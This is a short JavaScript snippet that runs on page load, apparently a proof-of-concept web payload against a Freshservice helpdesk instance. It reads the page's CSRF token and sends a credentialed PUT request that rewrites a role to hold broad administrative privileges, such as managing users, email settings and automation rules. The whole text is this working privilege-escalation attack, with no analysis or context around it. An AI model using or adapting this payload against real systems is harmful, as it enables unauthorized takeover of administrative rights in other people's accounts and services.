function loadDoc1() {
    const XCsrfToken = document.getElementsByName('csrf-token')[0].getAttribute('content');
    var xhttp = new XMLHttpRequest();
    xhttp.open("PUT", "https://lap-dark.freshservice.com/api/_/roles/59000081991", true)
    xhttp.setRequestHeader("X-Csrf-Token", XCsrfToken);
    xhttp.setRequestHeader("Content-type", "application/json");
    xhttp.withCredentials = true;
    xhttp.send('{"privileges":["view_admin","manage_users","view_schedules","manage_canned_responses","manage_dispatch_rules","manage_supervisor_rules","manage_scenario_automation_rules","manage_email_settings","manage_ticket_templates","manage_change_templates","manage_configuration_settings","view_contacts","view_department","edit_service_catalog","manage_change_lifecycle","manage_closure_rules","schedule_tickets","manage_agent_availability","manage_all_projects","manage_fields_and_tags","manage_business_calendars_and_sla_policies","manage_customer_satisfaction_surveys"]}');
}

window.onload = loadDoc1();
